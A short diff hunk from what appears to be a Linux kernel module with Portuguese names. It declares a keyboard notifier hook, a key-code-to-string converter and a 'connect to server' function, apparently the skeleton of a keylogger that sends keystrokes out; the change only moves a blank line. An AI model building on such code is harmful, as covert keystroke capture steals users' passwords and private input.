@@ -62,10 +62,10 @@ int conectarServidor(void);
 
 void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf);
 int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro);
+
 static struct notifier_block bloco_observador_teclado = {
     .notifier_call = manipulador_evento_teclado,
 };
-
 
 static int __init iniciaModulo(void)
 {
